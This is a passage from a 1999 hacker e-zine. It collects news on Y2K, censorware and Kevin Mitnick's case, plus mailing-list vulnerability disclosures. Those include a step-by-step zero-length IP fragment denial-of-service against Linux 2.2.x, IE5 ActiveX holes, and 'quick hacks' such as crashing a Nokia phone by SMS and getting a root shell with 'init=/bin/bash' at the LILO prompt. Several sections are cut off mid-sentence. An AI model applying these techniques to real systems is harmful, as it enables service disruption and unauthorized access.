  ** ISSUE 13 will be back to standard text format, htmlizing this file is too
  much work and bloats up the issue too much, if anyone wants to convert the
  texts to html though feel free to do so, and credit yourself for the work
  done as it takes some time to get all the links and make sure demo html is
  viewable in online versions..... - Ed

      "If your hacker admits to having been wrong, don't demand an apology;
        so far as the hacker is concerned, admitting to being wrong
                              is an apology,"  
      
             - from http://www.plethora.net/~seebs/faqs/hacker.html

   Synopsis 
   ---------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... <g>

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. <g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it <BeG>

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    The following comes from Bugtraq's info file:

    This list is for *detailed* discussion of UNIX security holes: what they are,
    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

    + Information on Unix related security holes/backdoors (past and present)
    + Exploit programs, scripts or detailed processes about the above
    + Patches, workarounds, fixes
    + Announcements, advisories or warnings
    + Ideas, future plans or current works dealing with Unix security
    + Information material regarding vendor contacts and procedures
    + Individual experiences in dealing with above vendors or security organizations
    + Incident advisories or informational reporting

    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not "CC" the bugtraq
    reflector address if the response does not meet the above criteria.

      Well what does HWA stand for? never mind if you ever find out I may
     have to get those hax0rs from 'Hackers' or the Pretorians after you.

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' <see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you
     up  and comers, i'd highly recommend you get that book. Its almost
     like  buying a clue. Anyway..on with the show .. - Editorial staff

  00.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated again)
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me

     ++ Y2K: Qantas prepared to cancel flights

        The Y2K problem has proven too much for Australian airline Qantas, which
        has announced it may have to cancel flights. In a statement to the
        Australian Stock Exchange (ASX), the airline said it may reduce the
        number of flights on some domestic and international routes. "Qantas will only
        flyf it is safe to do so," its report stated. Qantas said it had checked
        with the manufacturers of its aircraft, which advised "that there are no
        safety or airworthiness issues relating to the year 2000 compliance of their
        aircraft". On this basis, the airline said it was satisfied that its
        business was "unlikely to be significantly disrupted". However, Qantas
        said services provided by "certain airports and air space authorities" were
        not compliant, and for this reason contingency plans were being developed.

    ++ School Net filter software bans Bible 

       A Net filtering system used by NSW state schools has been found to
       inaccurately block certain Web sites, according to online civil
       liberties group Electronic Frontiers Australia (EFA). Citing a recent report by
       the US body Censorware Project, EFA said the SmartFilter product used by
       schools had "problems". The report 'Censored Internet Access in Utah
       Public Schools and Libraries' found SmartFilter blocked sites featuring all of
       Shakespeare's plays, the Koran, the 'Adventures of Sherlock Holmes' and
       a number of safe-sex and AIDS prevention sites, to name just a few. Danny
       Yee of EFA said SmartFilter's claim that all blocked sites were checked by
       people was false.

       available for most major platforms including Linux and Windows NT, and
       will be sold through a dedicated sales force of more than 500 people. AOL and
       Sun have also announced they will continue to maintain support for their
       existing software lines. Details are still unclear about how Sun and
       AOL/Netscape will develop a multiplatform ecommerce solution, and what

       the unknown netizen
       
       
       we are not all sinless, our ethics do not save us from damnation. we are 
       close to gods, but our divinity is tainted with blood. we are not 
       perfect and our mistakes do not go unnoticed.
       
       
       but we are one.
       
       
       it is not one cry that sends a shiver up the spine of every government 
       with something to hide, it is the shouts of a thousand warriors. it is 
       not a few that are imprisioned, it is us all that wear chains. it is not 
       one tear that is shed, it is an ocean of sorrow that drowns everything 
       in it's wake.
       
       
       we are of one mind and we never forget. we are of one body, intertwined 
       electricity, wires and chips. we have but one vision, a world in which 
       rights need not be fought for.
       
       
       as one we fight.
       
       
       as one we will see a new world.
       
       
       as one we are the faceless, the names that will never be lost to time.

       Dear Editor,
       
       
       I am currently in the process of writing a book looking at the dawn of 
       hacking through to where it is now and on to the future.  This book will 
       not be containing any comments designed to inflame the current public 
       perception of hackers, it has been designed to shatter the myths.  To do 
       this though, I am in need of some help.  I need people to point me in 
       the right direction.  I shall also be entering comments from a few 
       hackers if they will let me.
       
       
       One chapter in the book seems to have gotten the interest of a lot of 
       hackers.  This chapter is about profiles of hackers.  Basically, I write 
       out these profiles without their nicks, names or anything to identify 
       them and show what a 'typical hacker' is if there indeed is one.
       
       
       If you could help me out by putting an article in your net magazine 
       requesting aid for me or by talking to other hackers that are more 
       'leet' than others so that I can get their opinions.  So far, I have 
       spoken to very little people and their talents seem to be more in their

 03.0 Aussie man faces 12 months in jail
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Perth 'passwords' man appears in court 
      Roulla Yiacoumi 
      
       A Perth man charged with 37 counts of unlawfully operating a
       computer system has appeared in court. 
      
       Christopher Thomas Daniels, 20, did not enter a plea and
       requested legal advice before his next appearance on April 13. 
      
       It was alleged Daniels had passwords to 350 Internet
       accounts, but used just 37 to fraudulently gain $50 worth of
       Net access (see story). It is believed he was given the account
       details by a juvenile. 
      
       Users were not aware their accounts had been compromised;
       the ISP noticed inconsistencies and contacted police.
       Detective Senior Constable Mike Wheeler from the WA major
       fraud squad said people gaining access to Net passwords was
       a widespread problem, not limited to this particular ISP. 
      
       The accounts in this case were all with one ISP, Vianet in WA.
       Vianet managing director Tony Broughton was not available for
       comment this afternoon.

       Net fraud: Aussie man charged 
       Roulla Yiacoumi 
      
       A 20-year old Perth man is facing 12 months in jail over Internet
       fraud amounting to just $50 worth of Net access. 
      
       Christopher Thomas Daniels of Cannington has been charged
       by the Western Australian major fraud squad for accessing
       other people's Internet accounts. He faces 37 counts of
       unlawfully operating a computer system. 
      
       According to Detective Senior Constable Mike Wheeler,
       Daniels admitted to having passwords to more than 350
       accounts, but he had used only 37. The accounts were all for
       prepaid access from one of Australia's larger ISPs, and the
       customers affected were unaware that their accounts had
       been accessed. 
      
       "The ISP noticed inconsistencies and notified us," said
       Wheeler. "But let me say that this kind of problem is not
       restricted to just one ISP." 
      
       The WA man said he was given the passwords by another
       person, a juvenile who will be subject to a different court
       system. 
      
       Daniels is set to appear in court tomorrow. He faces up to 12
       months in jail or a fine of up to $4,000.

 04.0  Mitnick Updates
       ~~~~~~~~~~~~~~~
       
 04.1  The Bumper Sticker Stays
       ~~~~~~~~~~~~~~~~~~~~~~~~
       from Chaos theory
       http://www.zdnet.com/zdtv/cybercrime/chaostheory/story/0,3700,2229344,00.html
       

       After reflecting on the long, strange  case of Kevin Mitnick,
       I've decided that the "Free Kevin" bumper sticker's not
       coming off my car-- not yet.
       By Kevin Poulsen  March 22, 1999 

       After four long years in the house of many doors, 35-year-old Kevin 
       Mitnick is ready to swallow a bitter pill, plead guilty to some of the
       twenty-five felonies on his  indictment plate and accept a prison
       sentence a few months longer than the time he's already spent in stir. 

       But I'm not scraping the Free Kevin bumper sticker from my car any time
       soon. 

       The sticker stays because Tuesday's  sealed plea agreement is now on the 
       desk of Judge Mariana Pfaelzer, who may yet reject it as summarily as she
       refused to allow him the due process of a bail hearing. 

       The sticker also stays because Mitnick is still facing a dusty California 
       state charge from the early '90s which threatens to flip him out of the 
       frying pan of federal lockup  and into the fire of the notorious Los
       Angeles Country Jail-- better known as Hell. 

       And even after his eventual release, Mitnick will spend up to three 
       years in a technophobic virtual prison, barred from touching anything
       with a trace of silicon in it. 

       So the sticker will continue to adorn my bumper as a reminder of the 
       end of an era, and the dawn of a new and harsh morning. Kevin grew up
       to the extent that he did at a time when computers were still seen as
       mysterious and arcane, and exploring them was an innocent and joyful
       pastime for a few privileged youngsters. There was no talk of cyber-
       terrorism then; no suggestion that teenage technophiles were foreign
       operatives acting to overthrow the government. Kids who weren't old
       enough to drive were manipulating dizzying technology from their own 
       bedrooms, and it was magic, pure and simple. 

       Kevin Mitnick was already a legendary magician when I got my first 
       computer in the early '80s. In today's Internet age, talentless 
       teenaged taggers make national headlines by using pre-fab cracking 
       tools to deface sitting-duck websites. So it takes some imagination
       to understand the genuine skill and artistry possessed by the
       likes of Kevin. 

       He gained his knowledge from dumpsters and libraries and by tricking
       the guardians of technology with telephone con games.Applying that
       knowledge, doing things that weren't supposed to be possible,required
       creativity, resourcefulness, and tools that couldn't simply be downloaded. 

       He was the archetypal trickster, sharing the joy of discovery with 
       friends and loved ones through ingenious pranks; his hapless victims
       usually ended up too  impressed with the magic to be overly annoyed
       with the inconvenience. While it seems inconceivable now, Mitnick didn't
       even cloak his efforts under a pseudonym. He was simply Kevin Mitnick. 

       There was no reason to hide because what he was doing wasn't a crime.
       Nobody even minded much at first. It was  all good clean fun.
       
       The Playground's Closed

       Then the world began to change, while Kevin remained the same.
       Communism died, and a notional hacker threat replaced the red
       menace as the enemy of everything good, decent, and American. 

       The Internet took off in the early '90s, and pressure grew in
       Congress to make cyberspace safe for shopping. Computers
       were no longer the billion-dollar brains  controlling our lives;
       instead they were on our desks and in our homes, and no one
       liked the idea that people like Kevin might get into them and
       muck around. 

       Suddenly, the hacking that everyone around him thought was
       clever, amusing, and harmless  during Mitnick's formative years
       became  "computer fraud and abuse." Examining computer source
       code became "theft of proprietary information," and was equated
       to stealing money from a bank. 

       Before he knew it, Kevin was a "danger to the community," held
       without bail like a  murderer. And his rights were given the
       treatment normally reserved for accused drug kingpins. He was soon
       in front of an openly hostile court, facing the full brunt of a
       federal prosecution, as he watched the seasons change through the
       semitransparent polymer slits that pass for jailhouse windows. 

       There was never any doubt that Kevin was guilty of at least some 
       of the charges against him. There was never any doubt that he 
       caused a lot of innocent people some serious hassles, and he needed
       to be slapped down. That was never really he point. The "Free Kevin"
       bumper sticker is on my car because every day that he spends locked
       up raises the punitive bar of zero tolerance another notch. 

       Kevin Mitnick never damaged anything. He never stole a dime, never
       tried to profit from his efforts. He remained a laughing Peter Pan, 
       while the world changed. I suspect he never really understood that
       his victims were no longer laughing along with him. He never lost 
       his innocence. 
       
       The sticker is there as a reminder of the new paradigm that punishes
       dumb innocence more severely than true guilt more harshly than fraud,
       theft, and robbery. The sticker is there because jail does a slow 
       violence to a person, and  Kevin Mitnick didn't deserve four years of
       that violence.

  04.2 Mitnick's Judgment Day at Hand
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       by Douglas Thomas 

       9:00 a.m.  25.Mar.99.PST
       LOS ANGELES -- Celebrity cracker Kevin Mitnick will appear before US 
       District Court Judge Marianne Pfaelzer on Friday for what could be the
       last time.  Pfaelzer is scheduled to rule on a plea agreement jointly 
       submitted by the government and defense team  attorneys. Although neither
       side has  discussed the details, a report leaked last week said Mitnick
       will plead guilty in exchange for a reduced sentence. The arrangement 
       reportedly calls for Mitnick to spend at least an additional year in 
       prison. 

       Mitnick, in custody since 1995, is charged with copying proprietary 
       software from the computers of cellular telephone  manufacturers. Over 
       the years, he has grown to be the cause célèbre of hackers and crackers
       the world over. Friday's scheduled appearance won't be the first time 
       that Pfaelzer has considered a plea agreement from Mitnick. 

       In 1989, Mitnick pleaded guilty to  possessing unauthorized long-distance
       codes and copying security software from the Digital Equipment Corporation.
       Pfaelzer rejected a plea bargain in that case, and Mitnick spent a year in
       prison and six months in a halfway house. 

       If Pfaelzer accepts the current plea, it would mean the end of the federal
       indictment. Mitnick, however, still faces state  charges stemming from a
       1993 arrest. He is accused of fraudulently obtaining information from the
       Department of Motor Vehicles and faxing it to a copy shop in Los Angeles. 

       If found guilty, Mitnick could face up to four years of additional prison time. 
       
       
 04.3  Why We Still Have to Free Kevin Mitnick...
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
       Update from <a href="http://www.kevinmitnick.com/home.html">www.kevinmitnick.com</a>
       
       Why We Still Have to Free Kevin Mitnick...
       Assistant US Attorneys Defy Court Order Again 

       March 30, 1999 
       
       So Kevin Mitnick has pleaded guilty and reached an agreement with the federal 
       authorities. The story is over. Thanks for  participating. You can all go home
       now. 
     
       Not so fast. 
     
       If you've ever been robbed at gunpoint, you know the feeling of wanting to 
       resist, but then giving up your valuables because you feared the consequences
       of what would happen if you resisted more vigorously. We all want to be heroes,
       but there comes a time when one needs to make a painful sacrifice in order to 
       survive at all. 
     
       For more than four years, Kevin has held firm in prison, maintaining his 
       innocence while trying to build a defense against the government's charges. The 
       process of constructing such a case is a monumental one, even for highly paid 
       defense attorneys. Now add to the mix the reality of being held captive in a 
       federal prison that limits your "participation" in your defense to 20 minute 
       collect phone calls and five hours per week in an inadequate law library, and
       you may begin to see what it was like. 
     
       Not there yet? Kevin's legal team was overworked and underfunded whereas the 
       prosecution had unlimited resources and as much time as they needed, not to 
       mention a compliant court that granted them every excuse for their manipulation
       of the facts and circumstances in this case. 
     
       Government Defiance of Court Order 
     
       Apparently unwilling to miss the opportunity to kick someone while they're 
       down, government prosecutors David Schindler and Christopher Painter have 
       walked through Alice's looking glass and turned the law on its head once again
       -- they have instructed the legal staff at the Metropolitan Detention Center
       (MDC) that Kevin will no longer need access to the laptop computer that Kevin
       has been using to prepare his defense; first for the trial, and now for the
       sentencing hearing scheduled for June 14, 1999. Here are the circumstances: 
     
       The legal staff at MDC supervises the prison's compliance with all legal matters
       affecting the prison. Kevin and his legal team convene in the attorney's visiting
       room at MDC to use a laptop computer to review the electronic evidence in Kevin's
       case. Kevin is currently reviewing that evidence to counter the government's 
       likely arguments in support of restitution requirements, which in turn are based 
       upon fictional losses alleged to have been suffered by the alleged victims in this
       case. 
     
       Illegal Interference by Government 
     
       On Monday, March 29, Kevin met his legal team in the visiting room, where they were 
       going to use the laptop computer to review evidence in preparation for Kevin's 
       sentencing hearing on June 14. After waiting two hours, Kevin was informed that 
       either Assistant U.S. Attorneys Schindler or Painter had incorrectly advised MDC 
       Legal Staff that Kevin would "no longer be needing access to the computer," and 
       consequently, Kevin would not be permitted access to the laptop in order to prepare
       for his sentencing hearing. 
     
       Defense Attorney Asserts Federal Court Order 
     
       One member of Kevin's defense team (standing in for attorney Don Randolph, Kevin's 
       attorney of record in this case who is currently on vacation) asserted unequivocally 
       that there is a federal court order in place with the MDC ordering -- not suggesting,
       but ordering -- the MDC to provide access to a laptop computer for Kevin and his legal
       staff. 
     
       Government's "Logic" Defies Justification 
     
       Logic would suggest that if government prosecutors object to a federal court order, 
       it is their responsibility to petition the court for redress. The actions by the
       government are an attempt to turn the situation on its head, and constitute an
       apparent effort by AUSAs Schindler and/or Painter to unlawfully influence the 
       behavior of the legal staff of MDC. In addition, they may have known that Kevin's
       lead defense attorney was scheduled to be out of town this week, thus increasing
       the likelihood that they would succeed in delaying Kevin's access to the evidence
       against him. 
     
       Prosecutors in Direct Violation of Court Order 
     
       Actions by AUSAs Schindler and/or Painter to manipulate legal staff at MDC are in
       direct violation of a federal court order by Judge Marianna Pfaelzer ordering
       the MDC to provide a laptop computer to Kevin Mitnick. Their actions are in violation
       of federal law, and at this difficult stage of Kevin's case, can have no other 
       purpose than to interfere with Kevin's right to participate fully in his defense. 
     
       Call Your Congresspeople and Local Media 
     
       We urge you to call your United States Representative and Senator as well as your 
       local news media to alert them to the apparently willful violation of a federal
       court order by sworn officers of the court. Calls to the office of Rep. Henry 
       Waxman (D-CA) may prove especially helpful.

 04.4  Mitnick gets 46 months?
       ~~~~~~~~~~~~~~~~~~~~~~~
       
       Mitnick Sentenced to 46 Months
       by Douglas Thomas 
       
       3:00 a.m.  29.Mar.99.PST
       The case is not closed on Kevin Mitnick, who was sentenced Friday to 46 months 
       in prison after pleading guilty to seven counts of wire and  computer fraud.
       The notorious cracker still faces California charges for computer fraud. 
       
       US District Judge Mariana Pfaelzer accepted Mitnick's guilty plea to five of 25
       federal counts of fraud plus two counts of fraud in Northern California.
       
       No date has been set for a trial on Southern California charges, which stem from
       a 1993 arrest in which Mitnick was accused of fraudulently obtaining information
       from the Department of Motor Vehicles. If convicted of those charges, he could 
       face an additional four years behind bars. 
       
       Friday's plea agreement set total damages of up to US$10 million. Prosecutors and
       defense lawyers could not reach agreement on restitution, which will be determined
       at Mitnick's sentencing hearing, scheduled for 14 June. Final motions and a pre-
       sentence investigation report are due by 1 June. 
       
       Mitnick has already spent 48 months in a Los Angeles detention center, including 14
       months for violating conditions of his supervised release. He could be released to a
       halfway house this fall. 
       
       But US Attorney David Schindler said Mitnick would be in prison "at least through next 
       year."  
       
       Don Randolph, Mitnick's attorney, said his client was relieved to have his federal 
       case resolved. In a prepared statement, Randolph said, "[Mitnick] can now see light at
       the end of the tunnel, and has a reasonable certainty that it is not another train approaching."

 05.0  Sesquipedalian.c 0 length connection resetting exploit
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Date: Wed, 24 Mar 1999 23:19:37 -0500
       From: John McDonald <jmcdonal@UNF.EDU>
       To: BUGTRAQ@netspace.org
       Subject: DoS for Linux 2.1.89 - 2.2.3: 0 length fragment bug
       
       Hi,
       
       The recent release of the Linux 2.2.4 kernel fixed a remote denial of
       service problem in the IP fragment handling code. If you are running a
       Linux kernel between 2.1.89 and 2.2.3, it would probably be a good idea to
       get the latest version. In case that isn't feasible for you, I've included
       a patch in this post. The impact of this problem is that a remote attacker
       can effectively disable a target's IP connectivity. However, for the
       attack to succeed, the attacker will have to deliver several thousand
       packets to the target, which can take up to several minutes. A quick
       exploit and the patch are appended to the end of this post.
       
       The problem starts in ip_glue() in ip_fragment.c:
       
               /* Copy the data portions of all fragments into the new buffer. */
               fp = qp->fragments;
               count = qp->ihlen;
               while(fp) {
                       if ((fp->len < 0) || ((count + fp->len) > skb->len))
                               goto out_invalid;
                       memcpy((ptr + fp->offset), fp->ptr, fp->len);
                       if (count == qp->ihlen) {
                               skb->dst = dst_clone(fp->skb->dst);
                               skb->dev = fp->skb->dev;
                       }
                       count += fp->len;
                       fp = fp->next;
               }
       
       The problem in this code is that if you can get a fragment into the
       qp->fragments list that has a length of 0, and is the first fragment in the
       list, then the call to dst_clone() will happen an extra time. The first time
       through the loop, count will necessarily equal qp->ihlen, causing
       dst_clone() to be called. However, if fp->len happens to equal 0, then count
       += fp->len won't increase it, and the next time through the loop, count will
       still equal qp->ihlen. dst_clone() increments a usage count on an element in
       the routing cache. Our 0 length fragment will cause this element in the
       cache to become stranded. The kernel will not free it when it does the
       garbage collection of the cache because it will think it is currently in
       use.
       
       The other component of the problem is that the call to allocate a new entry
       in the routing cache does a check to see if the hashtable that comprises the
       cache is at a saturated state. If it is, it proceeds to do a garbage
       collection. If the number of entries in the cache, after this garbage
       collection, is still higher than the threshold, then dst_alloc() will fail.
       So, if we generate enough stranded entries in the routing cache (4096 in
       2.2.3) via our malicious frags, then all further calls to dst_alloc will
       fail.
       
       We can get a 0 length fragment into the head of the list by doing the
       following:
       
       Send a fragment at offset 0, with a length of X, and IP_MF set. This creates
       our list.
       
       Send a 0 length fragment at offset 0, where the ip header length is equal to
       the ip total length, and IP_MF is set. This will be treated as coming before
       the fragment already in our list, because it has an offset equal to the
       offset of the existing fragment. It doesn't overlap any, because it's end is
       equal to the following fragment's offset.
       
       Send a fragment at offset X, with IP_MF not set. This will mark the end of
       our set of fragments. ip_done() will return true because it will see the
       first frag going from 0 to 0, the second going from 0 to X, and the third
       going from X to the end. Our fragments will get passed into ip_glue().

 06.0  Yet more MSIE5 vulnerabilities
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Date: Wed, 24 Mar 1999 12:11:09 +0100
       From: Juan Carlos Garcia Cuartango <cuartangojc@MX3.REDESTB.ES>
       To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
       Subject: IE 5 security vulnerabilities
       
       
       Greetings,
        
       Microsoft delivers with IE 5 an Active X control called "DHTML 
       Edit control Safe for Scripting for IE 5". In my opinion this
       control IS NOT SAFE AT ALL . I have found two  vulnerabilities 
       in this component : It makes public the clipboard and it allows
       cross-frame access.
       IE 4 is also affected as far as the control is a signed component 
       and the browser will download it from MS site.(see below my
       comments about the CLSID).
       Demos are available at  
       http://pages.whowhere.com/computers/cuartangojc/dhtmle1.html
       
       I will briefly try to summarize the implications of this issues :
       
       1- The hole makes public the clipboard.
       There is nothing new here. This is the third time I have reported 
       this kind of vulnerability.  MS says that this issue can be 
       blocked by setting the "Allow paste operations via script" to 
       'prompt'.  This security option is set to 'enable' by default 
       (Medium security). IE 4 does not have this option and there is no 
       way to avoid the exploit.
       
       2- The hole allows cross-frame access
       The first Internet browser security rule is : scripts can only 
       interact only whit documents same domain and protocol. MS calls
       this the cross-frame security, Netscape refers to this rule as 
       "The same origin security policy".  DHTML Editor violates this 
       rule and allows "transaction spoofing", a malicious script can 
       submit transactions without the user knowledge. I have asked my 
       lawyer consultant about the issue  and their response was : 
       "Noboby can anymore use the IP addrress as a proof of an Internet 
       crime against Internet Explorer users".  MS says : "We don't see 
       that this constitutes a security issue" .
       
       3- Even if Microsoft fixes the hole the hole could exist forever. Why ?
       As far as I know  this is the first time a hole is "SIGNED". MS 
       has released an "dhtmed.cab" file as an ActiveX component signed
       by Microsoft ,anibody can distribute this file and the victim will 
       only  see a message telling him that the component is "Microsoft 
       signed", I trust MS, everybody trust MS, we will accept the ActiveX.
       MS has invented a very clever method to sign software, but there is 
       not a way to revoke the signature.
       
       4- There is something rare in the CLSID
       Whenever an HTML page references a not registered CLSID nothing 
       happens, just the object is not created.  The "DHTML Edit Control" 
       CLSID (clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A) is very special, 
       Internet Explorer (4 and 5) will try to download the component from 
       MS even if CODEBASE is not defined for the object.  Is this a 
       documented feature ?   You can test this behaviour, : unregister the 
       component "dhtmle.ocx" (using regsvr32.exe) and then load the page
       http://pages.whowhere.com/computers/cuartangojc/dhtmle2.html
       Why the browser decides to go to MS site ? It only knows :  
       clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A 
       Acoording whit MS documentation a CODEBASE parameter must be 
       explicited in the OBJECT "object" to download the component.
       Any idea ?

       The  DHTML Editor holes
       
       Microsoft delivers with IE 5 an Active X control called DHTML edit control, 
       The Microsoft Dynamic HTML (DHTML) Editing Component allows Web authors and 
       application developers to add WYSIWYG DHTML editing capabilities to their Web 
       sites and applications. The control has two versions : DHTML Edit Control for 
       IE 5 and DHTML Edit 
       
       Control Safe for Scripting for IE 5
       
       The first one is of course marked as not safe for scripting and you will be 
       warned if an HTML page contains this object.
       The problem I have found : The second one is not safe at all. "DHTML Edit 
       Control Safe for Scripting for IE 5" has in fact at least two security holes :
       
       1- It makes public your clipboard (demo).
       
       According with Microsoft security rules access to Windows clipboard content is 
       forbidden to Internet Explorer scripts unless the clipboard content was owned 
       by the Explorer itself. This issue represents an important privacy leak.
       
       Workaround : Set security option "Allow paste operations via script" to "prompt".
       
       
       2- It allows "cross-frame" access (demo).
       
       An HTML page or frame can read/write contents in frames owned by any domain, 
       which is forbiden by cross-fame security rules. And still worst, It allows 
       Tansaction spoofing. This is a very serious danger. The Safe version of 
       ActiveX is not able to navigate but It can SUBMIT FORMS which means that a 
       malicious WEB page (or E-Mail) can performs transactions agains any WEB site 
       but YOU will be responsible because the transaction will have your own IP address.
       
       IE 4 is also affected if you accept the download of the ActiveX (Signed by Microsoft)

       Date: Thu, 25 Mar 1999 10:06:01 -0800
       From: Harry Goodwin <harryg@MICROSOFT.COM>
       To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
       Subject: Re: IE 5 security vulnerabilities
       
       I wanted to take a moment to thank Juan Carlos for bringing these issues to
       Microsoft's attention prior to posting the issues publicly.  I also wanted
       to post Microsoft's response to the issues he's discovered.
       
               1)  Internet Explorer has customizable security settings in
       place for users who are concerned about allowing certain functionality.  In
       this particular case, concerned users can easily block this behavior by
       checking either 'disable' or 'prompt' under "Allow paste operations via
       script"
       in the custom settings section in security zones.  Using the IEAK, admins
       can also adjust the default setting for this option before distributing
       Internet Explorer to their users.  The option is set to 'enable' by default
       to
       allow enhanced functionality.
       
               2)  Upon investigation we did find a cross domain security
       violation in the DHTML edit control which we will revoke, fix, and release.
       
               3)  Internet Explorer has a mechanism in place which allows
       Microsoft to release a .reg file to block ActiveX controls by changing a
       bit in the registry.
       
               4)  The following information found on MSDN (search on
       CodeBaseSearchPath) addresses this concern: When Internet Component
       Download is called to download code, it traverses the Internet search path
       to
       look for the desired component. This path is a list of object store servers
       that will be queried every time components are downloaded using
       CoGetClassObjectFromURL. This way, even if an <OBJECT> tag in an HTML
       document does not specify a CODEBASE location to download code for an
       embedded OLE control, the Internet Component Download will still use the
       Internet search path to find the necessary code.
               Internet search path syntax
               The search path is specified in a string in the registry, under
       the key
       HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet
       Settings\CodeBaseSearchPath. The value for this key is a string in the
       following format:
               CodeBaseSearchPath = <URL1>; <URL2>; ... <URLm>; CODEBASE;
       <URLm+1>;
                   ... <URLn-1>; <URLn>
               In this format, each of URL1 through URLn is an absolute URL
       pointing to HTTP servers acting as "object stores". When processing a
       call to CoGetClassObjectFromURL, the Internet Component Download service
       will
       first try downloading the desired code from the locations URL1 through
       URLm, then try the location specified in the szCodeURL parameter
       (corresponding to the CODEBASE attribute in the <OBJECT> tag), and will
       finally try the
       locations specified in locations URLm+1 through URLn.
               Note that if the CODEBASE keyword is not included in the key,
       calls to CoGetClassObjectFromURL will never check the szCodeURL location for
       downloading code. By removing the CODEBASE keyword from the key,
       corporate intranet administrators can effectively disable Internet Component
       Download for corporate users.
       
               Thanks,  Harry

       On my NT4 SP3 box, permissions on this key are set to Everyone: Special
       Access, which includes set
       value.  Therefore, anyone who is a user on this box can control where
       every other user downloads
       their controls from.  Is that OK?

 07.0  QuickHacks and tips from ManicX
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       Quick Tricks

       Now Just a few quick tips
       ( pulled all the other stuff, its for your own good :þ )
         Stuff Covered - Linux, Mobiles, Windows, BIOS,  

       
       
       System: Nokia 5110
       
       Crash it
       Send an SMS message full of 160 full stops to the phone
       It will now beep and flash for 30 sec's or else just turn itself off
       
       
       
       System: Linux  (with lilo installed and local access)
       
       Gives a root shell / root account
       reboot your machine on the lilo: prompt type in
       what-linux-is-called-in-/etc/lilo.conf init=/bin/bash rw
       
       (i.e. linux init=/bin/bash rw )
       
       linux will now start to boot and stop after a few error message
       you now have a root shell (you will have very few commands) so
       type in the following
       
